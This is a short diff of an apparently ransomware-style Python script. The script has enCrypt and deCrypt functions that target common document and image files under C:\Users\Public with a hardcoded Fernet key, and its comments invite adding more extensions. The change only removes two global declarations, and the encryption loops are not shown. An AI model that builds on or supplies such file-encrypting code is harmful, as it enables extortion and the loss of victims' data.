@@ -14,7 +14,6 @@ def ascii_scrpt():
     
                     
 def enCrypt():
-    global rootdir
     fernet = Fernet(b'ffiQ4--kfcdDUrmdVHWgmaoQf_YGBC2gXxG5Yz-0Rz0=') #Generate your own key or use this as default
     rootdir = 'C:\\Users\\Public' #FILE PATH TO ENCRYPT
     extensions = ('.docx', '.pdf', '.png', '.txt', '.jpg') # ADD AS MANY FILE EXTENSION AS YOU WANT TO ENCRYPT
@@ -35,7 +34,6 @@ def enCrypt():
 
 
 def deCrypt():
-    global toordir
     fernet = Fernet(b'ffiQ4--kfcdDUrmdVHWgmaoQf_YGBC2gXxG5Yz-0Rz0=') #Generate your own key or use this as default
     toordir = 'C:\\Users\\Public' #FILE PATH TO DECRYPT 
     extensions = ('.docx', '.pdf', '.png', '.txt', '.jpg')  #FILE EXTENSION TO DECRYPT SHOULD BE THE SAME AS ABOVE
